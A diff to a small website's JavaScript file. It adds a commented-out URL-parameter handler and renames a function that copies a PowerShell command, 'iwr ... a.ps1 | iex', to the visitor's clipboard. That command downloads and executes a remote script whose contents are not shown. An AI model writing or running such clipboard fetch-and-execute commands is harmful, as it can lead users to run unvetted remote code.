@@ -1,10 +1,27 @@
+console.log("What are you looking at?");
+
+// const params={}
+// location.href.split('?').forEach(function (item) {
+//     let tmp = item.split('=');
+//     params[tmp[0]] = tmp[1];
+// })
+//
+// console.log(params, params.hasOwnProperty('mitoza'));
+//
+// if (params.hasOwnProperty('mitoza')){
+//     console.log(params.mitoza);
+//     switch (params.mitoza) {
+//         case '1':
+//             console.log('jeden');
+//             window.open('https://ksawix0.github.io/WebPage?mitoza=1','_blank');
+//     }
+// }
+
 document.querySelectorAll(".clickable").forEach(function(element) {
     element.addEventListener("click", function() {
         alert("hello world");
     });
 });
-
-console.log("What are you looking at?");
 
 function bt() {
     alert('hello world');  
@@ -85,6 +102,6 @@ function dk(id){
         }
 }
 
-function mitoza(){
+function mitoza_cp(){
     navigator.clipboard.writeText("iwr \"https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1\" | iex")
 }
